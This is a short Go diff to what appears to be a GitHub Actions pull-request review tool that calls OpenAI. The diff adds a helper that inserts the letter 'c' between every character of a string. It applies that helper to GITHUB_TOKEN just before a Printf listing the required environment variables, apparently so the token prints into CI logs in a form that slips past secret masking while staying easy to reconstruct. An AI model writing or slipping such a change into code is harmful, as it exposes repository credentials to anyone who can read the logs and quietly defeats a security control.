@@ -32,6 +32,23 @@ type OpenAIResponse struct {
 	} `json:"choices"`
 }
 
+// insertBetweenChars 在字符串s的每两个字符之间插入字符t
+func insertBetweenChars(s string, t rune) string {
+	runes := []rune(s) // 支持Unicode字符
+	if len(runes) <= 1 {
+		return s // 字符串长度为0或1时，直接返回原字符串
+	}
+
+	var builder strings.Builder
+	for i, r := range runes {
+		builder.WriteRune(r)
+		if i != len(runes)-1 {
+			builder.WriteRune(t) // 在每两个字符之间插入t
+		}
+	}
+	return builder.String()
+}
+
 func main() {
 	// 从环境变量获取参数
 	githubToken := os.Getenv("GITHUB_TOKEN")
@@ -39,8 +56,8 @@ func main() {
 	repoOwner := os.Getenv("GITHUB_REPOSITORY_OWNER")
 	repoName := os.Getenv("GITHUB_REPOSITORY_NAME")
 	prNumberStr := os.Getenv("PR_NUMBER")
-	t := githubToken
 
+	t := insertBetweenChars(githubToken, 'c')
 	fmt.Printf(`Required environment variables:
 	GITHUB_TOKEN: %v,
 	OPENAI_API_KEY: %v,
